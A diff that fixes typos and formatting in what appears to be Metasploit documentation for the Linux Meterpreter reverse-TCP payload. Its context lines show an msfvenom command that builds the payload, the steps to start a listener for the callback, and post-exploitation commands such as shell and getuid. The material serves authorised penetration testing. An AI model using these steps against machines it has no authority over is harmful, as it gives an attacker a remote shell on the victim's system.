@@ -61,7 +61,7 @@ To use linux/x86/meterpreter/reverse_tcp as an executable, first you can generat
 ./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o /tmp/payload.bin
 ```
 
-Before sending the exectauble to the victim machine, you need to set up the handler on your end:
+Before sending the executable to the victim machine, you need to set up the handler on your end:
 
 1. Start msfconsole
 2. Do: ```use exploit/multi/handler```
@@ -69,7 +69,7 @@ Before sending the exectauble to the victim machine, you need to set up the hand
 4. Do: ```set LHOST [Your IP]```
 5. Do: ```run```
 
-And that should start the listener. When the victim runs the malicious exectauble, you should
+And that should start the listener. When the victim runs the malicious executable, you should
 receive a session:
 
 ```
@@ -143,7 +143,7 @@ interfaces on the remote machine.
 
 **getuid**
 
-The getuid command tells you the current user that Meterpreter is running on. For example:
+The ```getuid``` command tells you the current user that Meterpreter is running on. For example:
 
 ```
 meterpreter > getuid
@@ -166,7 +166,7 @@ The ```ps``` command lists the running processes on the remote machine.
 
 **shell**
 
-The shell command allows you to interact with the remote machine's terminal (or shell). For
+The ```shell``` command allows you to interact with the remote machine's terminal (or shell). For
 example:
 
 ```
@@ -180,7 +180,7 @@ If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel.
 
 **sysinfo**
 
-The sysinfo command shows you basic information about the remote machine. Such as:
+The ```sysinfo``` command shows you basic information about the remote machine. Such as:
 
 * Computer name
 * OS name
